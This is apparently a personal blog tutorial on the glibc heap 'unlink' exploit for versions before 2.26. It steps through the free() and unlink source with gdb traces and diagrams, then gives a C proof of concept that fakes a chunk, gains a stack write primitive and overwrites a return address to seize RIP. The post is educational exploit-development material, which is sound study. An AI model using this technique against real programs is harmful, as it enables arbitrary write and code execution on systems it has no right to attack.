---
layout: single
title:  "Heap Unlink"
date:   2020-06-14

classes: wide

---


# Summary 

This post introduce a simple heap exploitation called unlink , where it can be useful when you are deal with GLIBC < 2.26 , the issue with the implementation mechanisms are there is no security check of previous size at unlink macro , a new version of GLIBC reduce the the impact of this issue by adding a 2 security check (previous size .. chunksize) .. => ( chunksize(P) != prev_size (next_chunk(P))//malloc.c:1405 !!! to exploit that , the attacker must leak libc address then fake a chunk structure to bypass the security check at unlink macro to get R/W! 



# Unlink exploit 


..







**Free** implemntation 



```c
static void
_int_free(mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr*    fb;          /* associated fastbin */
  mchunkptr       nextchunk;   /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int             nextinuse;   /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr       bck;         /* misc temp for linking */
  mchunkptr       fwd;         /* misc temp for linking */

  const char *errstr = NULL;
  int locked = 0;

```



let's see what happens when we freed the first chunk ! first the **ptr** will pass through function called public_FREe 

```c
free(1) 

start from here 

2952	void
2953	public_fREe(void* mem)
gdb-peda$ list
2954	{
2955	  mstate ar_ptr;
2956	  mchunkptr p;                          /* chunk corresponding to mem */
2957	
2958	  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t)
2959	    = force_reg (__free_hook);
2960	  if (__builtin_expect (hook != NULL, 0)) {
 ..etc
   
   
    munmap_chunk(p);
    return;
  }

  ar_ptr = arena_for_chunk(p);
  _int_free(ar_ptr, p, 0); // Fahad here is the most important part we need to dig deep into it
}
libc_hidden_def (public_fREe
                 
                 

```



at this time the most important part of the above code is _init_free where it's the implmentation of free and we can take a look at the its structure 



free(chunk1) => 0x602010



```
/prototype 

static void     _int_free(mstate, mchunkptr, int);

```



```c
_int_free(mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr*    fb;          /* associated fastbin */
  mchunkptr       nextchunk;   /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int             nextinuse;   /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr       bck;         /* misc temp for linking */
  mchunkptr       fwd;         /* misc temp for linking */

  const char *errstr = NULL;
  int locked = 0;


  //chunk1 = 0x602010
  // but p now = (0x602010 - 0x10)
  // 0x602000
  size = chunksize(p); // size will be 0x90, you should figure out how is that by testing functionallity

```



// chunksize imp

```c
/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
#define PREV_INUSE 0x1

/* extract inuse bit of previous chunk */
#define prev_inuse(p)       ((p)->size & PREV_INUSE)


/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */
#define IS_MMAPPED 0x2

/* Get size, ignoring use bits */
#define chunksize(p)         ((p)->size & ~(SIZE_BITS))

// Fahad what ~(SIZE_BITS) mean ??? 
// Here is the answer
#define SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)
// Fahad note PREV_INUSE -> = 0x1 , is_MMAPPED -> = 0x2
```



now let's move to the next code 

```
//gdb-peda$ p (uintptr_t) p
//$23 = 0x602000

//gdb-peda$ p (uintptr_t) -size
$22 = 0xffffffffffffff70

//

if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    {

//Fahad the first security we just got it , but the second one , was the define in the begnning of the file 

#define misaligned_chunk(p) \
  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \
   & MALLOC_ALIGN_MASK)
   
   
   
```



the last security check 



```
gdb-peda$ p size
$26 = 0x90

if (__builtin_expect (size < MINSIZE, 0))
    {
      errstr = "free(): invalid size";
      goto errout;
    }


#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
  
  
  
```





now let's focus on the most important one , which what we are going to targeted to get arbtiary write what where , but we have to understand the implmentation in order to manpuluate it in the future , 



```c
   // Fahad line -> 4117
   /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(p, bck, fwd);
    }
	
//free(1)
//the first free will be jump out this instructions , cuz
// the prev_inuse has not use yet 
//gdb-peda$ p $rbx+0x8
//$4 = 0x602008
// it will check if rbx+0x8 point to 
  0x7ffff7a975dd <_int_free+413>:	test   BYTE PTR [rbx+0x8],0x1
   0x7ffff7a975e1 <_int_free+417>:	jne    0x7ffff7a97627 <_int_free+487>
   0x7ffff7a975e3 <_int_free+419>:	mov    rax,QWORD PTR [rbx]
   0x7ffff7a975e6 <_int_free+422>:	sub    rbx,rax
   0x7ffff7a975e9 <_int_free+425>:	add    rbp,rax

     
// Second security check 
//free(1) , will jump out this security check cuz the next chunk is used
4127	      /* consolidate forward */
4128	      if (!nextinuse) { /* true if nextchunk is used */
4129		unlink(nextchunk, bck, fwd);
4130		size += nextsize;


  free(1)
// Now we are reach this line 
//gdb-peda$ x/1g $r13+0x68
//0x7ffff7dd3788 <main_arena+104>:	0x00007ffff7dd3778
//gdb-peda$ x 0x00007ffff7dd3778
//0x7ffff7dd3778 <main_arena+88>:	0x0000000000602360
gdb-peda$ x/8xg 0x0000000000602360
0x602360:	0x0000000000000000	0x0000000000020ca1
0x602370:	0x0000000000000000	0x0000000000000000
0x602380:	0x0000000000000000	0x0000000000000000
0x602390:	0x0000000000000000	0x0000000000000000

  
4140	      bck = unsorted_chunks(av); //0x00007ffff7dd3778
4141	      fwd = bck->fd; //0x00007ffff7dd3778 this will point to the top of chunk size :$ 
4142	      if (__builtin_expect (fwd->bk != bck, 0)) // now bck
4143		{
4144		  errstr = "free(): corrupted unsorted chunks";
4145		  goto errout;

    
```



Now let's see what happens with free(3 )

```
free(3)



```







exploit 



```c
local variable &chunk1 = 0x7fffffffe520
chunk1  = 0x602010
chunk2  = 0x6020a0
fake_chunk address = 0x602010
fake_chunk->fd = 0x7fffffffe508
fake_chunk->bk = 0x7fffffffe510


free(chunk2)
gdb-peda$ x/16g 0x6020a0-0x8-0x8
0x602090:	0x0000000000000080	0x0000000000000090

//Fahad the free(chunk2) point to 0x602090 

/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
#define PREV_INUSE 0x1
  

/* extract inuse bit of previous chunk */
#define prev_inuse(p)       ((p)->size & PREV_INUSE)
..etc

4115	    /* consolidate backward */
  				//p->size = 0x90
          // it will check if the prev 
  				//Fahad this mean p p->size & 0x1
4116	    if (!prev_inuse(p)) { // if == 0 , then will pass the check
4117	      prevsize = p->prev_size;
4118	      size += prevsize;
4119	      p = chunk_at_offset(p, -((long) prevsize));
4120	      unlink(p, bck, fwd);




  
  #define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
    malloc_printerr (check_action, "corrupted double-linked list", P); \
  else {                                                               \
    FD->bk = BK;                                                       \
    BK->fd = FD; 
  

 
let's start from the first 2 lines  
   
  FD = P->fd;                                                          \
  BK = P->bk;  


 first  

gdb-peda$ x/1xg $rbx+0x10
0x6010b0:	0x00007fffffffe530

  FD = P->fd; 
=> 0x7ffff7a975ec <_int_free+428>:	mov    rax,QWORD PTR [rbx+0x10] 

  second 
  gdb-peda$ x/1xg $rbx+0x18
	0x602028:	0x00007fffffffe510
  BK = P->bk; 
  0x7ffff7a975f0 <_int_free+432>:	mov    rdx,QWORD PTR [rbx+0x18]
 
  0x7ffff7a975f4 <_int_free+436>:	cmp    rbx,QWORD PTR [rax+0x18]

     
     
```



to further detail , let's draw a simple diagram to see what happens during the unlink in the privious code



```c
    BK                                P                          FD

+--------------+                +--------------+            +--------------+
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
+--------------+                +--------------+            +--------------+
|      FD      |                |       FD     |            |      FD      |
|              |                |              |            |              |
+--------------+                +--------------+            +--------------+
|      BK      |                |       BK     |            |      BK      |
|              |                |              |            |              |
+--------------+                +--------------+            +--------------+

```



0x7fffffffe530+0x18 

FD = P->fd

```
    BK                                P                          FD

+--------------+                +--------------+            +--------------+
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              ^            |              |
+--------------+                +--------------+            +--------------+
|      FD      |                |       FD     |            |      FD      |
|              |                |              +----------->+              |
+--------------+                +--------------+            +--------------+
|      BK      |                |       BK     |            |      BK      |
|              |                |              |            |              |
+--------------+                +--------------+            +--------------+

```



//0x7fffffffe538 + 0x10

BK = P->bk 



```
    BK                                P                          FD

+--------------+                +--------------+            +--------------+
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              |                |              |            |              |
|              +<--------+      |              |            |              |
|              |         |      |              |            |              |
|              |         |      |              ^            |              |
+--------------+         |      +--------------+            +--------------+
|      FD      |         |      |       FD     |            |      FD      |
|              |         |      |              +----------->+              |
+--------------+         |      +--------------+            +--------------+
|      BK      |         +------+       BK     |            |      BK      |
|              |                |              |            |              |
+--------------+                +--------------+            +--------------+

```





Security check 



```

```



```
  
  //Fahad , it says if //FD->fd->bk  != P or Bk->fd->bk != P
  
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) 
  // Fahad , this condition will check whether the dobule linked list work properly or not , if something unexpect then it will throw it as a corrupt double linkedlist 
  
  //disassemble
  
  FD->bk != P // first 
  
  0x7ffff7a975f4 <_int_free+436>:	cmp    rbx,QWORD PTR [rax+0x18]
	rax+0x18 = 0x7fffffffe548:	0x00000000006010a0
	=============
  BK->fd != P // Second 
  0x7ffff7a975fe <_int_free+446>:	cmp    rbx,QWORD PTR [rdx+0x10]

  rdx+0x10 = 0x7fffffffe548:	0x00000000006010a0
  
  
  
```



**Write What Where :D ** 



    FD->bk ==> 0x7fffffffe548
    BK === > 
    
    
    BK->fd ==> 0x7fffffffe548
    

```
..etc 
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
    malloc_printerr (check_action, "corrupted double-linked list", P); \
  else {

    //write what where 
    
    
    FD->bk = BK;   //  
    
   //what important to us , where it will give us R/W 
    BK->fd = FD;   
```



let's first draw a stack and see how it looks like for better understanding 



```
                   Stack                                           Heap Region ..
              +-----------------------+                        +------------------+
0x7fffffffe530|                       |                        |                  |
              |      0                |                        |                  |
              |                       |                        |                  |
              +-----------------------+                        +------------------+
0x7fffffffe538|                       |                        |                  |
              |      0                |                        | Ch 1 =           |
              +-----------------------+                        |                  |
              |                       |                        +------------------+
0x7fffffffe540|      0                |                        | Ch 2 = 6010a0    |
              |                       |      +---------------->+                  |
              +-----------------------+      |                 +------------------+
              |                       |      |                 |                  |
0x7fffffffe548|   0x00000000006010a0  |      |                 |                  |
              |                       +------+                 |                  |
              +-----------------------+                        +------------------+
              |                       |                        |                  |
0x7fffffffe550|   0x0000000000601010  |                        |                  |
              +-----------------------+                        |                  |
              |                       |                        +------------------+
0x7fffffffe558|   0x0000000000601130  |
              +-----------------------+
              |                       |
              |                       |
0x7fffffffe560|   0x00000000006011c0  |
              +-----------------------+
              |                       |
0x7fffffffe568|   0x0000000000601250  |
              +-----------------------+
              |                       |
0x7fffffffe570|   0x00000000006010a0  |
              +-----------------------+
              |                       |
              |                       |
              +-----------------------+

```




```
   //what important to us , where it will give us R/W 
    BK->fd = FD;   
    
```





```
                             Stack                                           Heap Region ..
                        +-----------------------+                        +------------------+
          0x7fffffffe530|                       |                        |                  |
                        |      0                |                        |                  |
                        |                       |     +---+              |                  |
  Getting R/W           +-----------------------+     |   |              +------------------+
+-------->0x7fffffffe538+-----------------------------+   |              |                  |
|                       |                       |         |              | Ch 1 =           |
|                       +-----------------------+         |              |                  |
|                       |                       |         |              +------------------+
|         0x7fffffffe540|      0                |         +>             | Ch 2 = 6010a0    |
|                       |                       |     +-----------+      |                  |
|                       +-----------------------+     | 0x7ff..   |      +------------------+
|                       |                       |     +-----------+      |                  |
+---------+x7fffffffe548|   0x00000000006010a0  |     |           |      |                  |
                        |                       |     | 0x7ff..   |      |                  |
                        +-----------------------+     |           |      +------------------+
                        |                       |     +-----------+      |                  |
          0x7fffffffe550|   0x0000000000601010  |     |           |      |                  |
                        +-----------------------+     | 0x7ff     |      |                  |
                        |                       |     |           |      +------------------+
          0x7fffffffe558|   0x0000000000601130  |     +-----------+
                        +-----------------------+     |           |
                        |                       |     |  0x7ff    |
                        |                       |     |           |
          0x7fffffffe560|   0x00000000006011c0  |     +-----------+
                        +-----------------------+
                        |                       |
          0x7fffffffe568|   0x0000000000601250  |
                        +-----------------------+
                        |                       |
          0x7fffffffe570|   0x00000000006010a0  |
                        +-----------------------+
                        |                       |
                        |                       |
                        +-----------------------+

```







```
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>



struct fake_obj { 

  size_t prev_size;
  size_t size;
  struct fake_obj *fd;
  struct fake_obj *bk;
  char buf[10];               // padding

};

int main() {


  //fahad it will be 8 bytes 
  char *chunk1,*chunk2,*chunk3,*chunk4,*chunk5;

  //fahad 
  //fake_chunk->prev_size
  //fake_chunk->size
  //fake_chunk->fd
  //fake_chunk->bk

  struct fake_obj *fake_chunk, *chunk2_hdr;


  // First grab two chunks (non fast)
  chunk1 = malloc(0x80);
  chunk2 = malloc(0x80);
  chunk3 = malloc(0x80);
  chunk4 = malloc(0x80);
  chunk5 = malloc(0x80);

  
  printf("local variable &chunk1 = %p\n", &chunk2);
  printf("chunk1  = %p\n", chunk2); //0x602010
  printf("chunk2  = %p\n", chunk3); //0x6020a0

  printf("chunk3 address = %p\n",chunk3); //0x602130

  //cast fake_chunk to chunk2 
  fake_chunk = (struct chunk_structure *)chunk2;
  printf("fake_chunk address = %p\n",fake_chunk); //0x602130

  fake_chunk->fd = (struct chunk_structure *)(&chunk2 - 3);

  fake_chunk->bk = (struct chunk_structure *)(&chunk2 - 2); // Ensures P->bk->fd == P
  printf("fake_chunk->bk = %p\n",fake_chunk->bk);

  // Next modify the header of chunk2 to pass all security checks

  chunk2_hdr = (struct chunk_structure *)(chunk3-16);

  //modify prev_size 
  chunk2_hdr->prev_size = 0x80;
  //to pass the security check 
  chunk2_hdr->size = 0x90;

  // R/W permtives 


  //memset(fake_chunk->buf,'A',0x10);

  //memset(fake_chunk->)
  free(chunk3);

  printf("%p\n", chunk2);
  printf("%x\n", chunk2[3]);


  return 0;
}






```



```
gdb-peda$ p chunk2
$1 = 0x7fffffffe530 ""
gdb-peda$ p chunk1
$2 = 0x602010 ""
gdb-peda$ p chunk2
$3 = 0x7fffffffe530 ""

```



as you can see here , we do have R/W at chunk2 , now let's control IP :D





```
  //emset(chunk2,'B',0x58+0x6);
  //0000| 0x7fffffffe588 --> 0x7ffff7a3a7ed (<__libc_start_main+237>:	mov    edi,eax)
  //let's overwrite it 
  /*
gdb-peda$ p/x 0x7fffffffe588-0x7fffffffe530
$1 = 0x58

  */
   //memset(chunk2,'A',0x58);
  //overwrite 
  //0x7fffffffe588 --> 0x7ffff7a3a7ed (<__libc_start_main
  //with magic gadget
  //control RIP 
  //0x4507a
  memcpy(chunk2+0x58,"CCCCCC",0x6);
   /*

	gdb-peda$ i r rip
	rip            0x434343434343	0x434343434343


```





```
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>



struct fake_chunk { 

  size_t prev_size;
  size_t size;
  struct fake_chunk *fd;
  struct fake_chunk *bk;
  char buf[10];              

};

int main() {


  //fahad it will be 8 bytes 
  char *chunk1,*chunk2,*chunk3,*chunk4,*chunk5;

  //fahad 
  //fake_chunk->prev_size
  //fake_chunk->size
  //fake_chunk->fd
  //fake_chunk->bk

  struct fake_chunk *fake_chunk, *chunk2_hdr;


  // First grab two chunks (non fast)
  chunk1 = malloc(0x80);
  chunk2 = malloc(0x80);
  chunk3 = malloc(0x80);
  chunk4 = malloc(0x80);
  chunk5 = malloc(0x80);

  
  printf("local variable &chunk2 = %p\n", &chunk2);
  printf("chunk3  = %p\n", chunk2); //0x602010
  printf("chunk3  = %p\n", chunk3); //0x6020a0

  printf("chunk3 address = %p\n",chunk3); //0x602130

  //cast fake_chunk to chunk2 
  fake_chunk = (struct fake_chunk *)chunk2;
  printf("fake_chunk address = %p\n",fake_chunk); //0x602130

  fake_chunk->fd = (struct fake_chunk *)(&chunk2 - 3);

  fake_chunk->bk = (struct fake_chunk *)(&chunk2 - 2); // Ensures P->bk->fd == P
  printf("fake_chunk->bk = %p\n",fake_chunk->bk);

  // Next modify the header of chunk2 to pass all security checks

  chunk2_hdr = (struct fake_chunk *)(chunk3-16);

  chunk2_hdr->prev_size = 0x80;
  //to pass the security check 
  chunk2_hdr->size = 0x90;

  // R/W permtives 

  //memset(fake_chunk->buf,'A',0x10);

  //memset(fake_chunk->)
  free(chunk3);


  printf("%p\n", chunk2);
  printf("%x\n", chunk2[3]);
  //emset(chunk2,'B',0x58+0x6);
  //0000| 0x7fffffffe588 --> 0x7ffff7a3a7ed (<__libc_start_main+237>:	mov    edi,eax)
  //let's overwrite it 
  /*
gdb-peda$ p/x 0x7fffffffe588-0x7fffffffe530
$1 = 0x58

  */
   //memset(chunk2,'A',0x58);
  //overwrite 
  //0x7fffffffe588 --> 0x7ffff7a3a7ed (<__libc_start_main
  //with magic gadget
  //control RIP 
  //0x4507a
  memcpy(chunk2+0x58,"CCCCCC",0x6);
   /*

	gdb-peda$ i r rip
	rip            0x434343434343	0x434343434343

   */

/*


gdb-peda$ x/64xg 0x7fffffffe590-0x16
0x7fffffffe57a:	0x4141414141414141	0x4141414141414141
0x7fffffffe58a:	0x000000007fff4141	0xe668000000000000


Stopped reason: SIGSEGV
0x00007fff41414141 in ?? ()




0x7fffffffe588:	0x00007ffff7a3a7ed	0x0000000000000000
0x7fffffffe598:	0x00007fffffffe668	0x0000000100000000
0x7fffffffe5a8:	0x0000000000400594	0x0000000000000000


gdb-peda$ x/1xg 0x7fffffffe538
0x7fffffffe538:	0x0000000000400722




   out target mov edi, 0x4008a0 :$
   0x400704 <main+368>:	mov    eax,0x0
   0x400709 <main+373>:	call   0x400480 <printf@plt>
=> 0x40070e <main+378>:	mov    edi,0x4008a0
   0x400713 <main+383>:	call   0x400470 <puts@plt>




*/
  return 0;
}
































```







References 



https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/





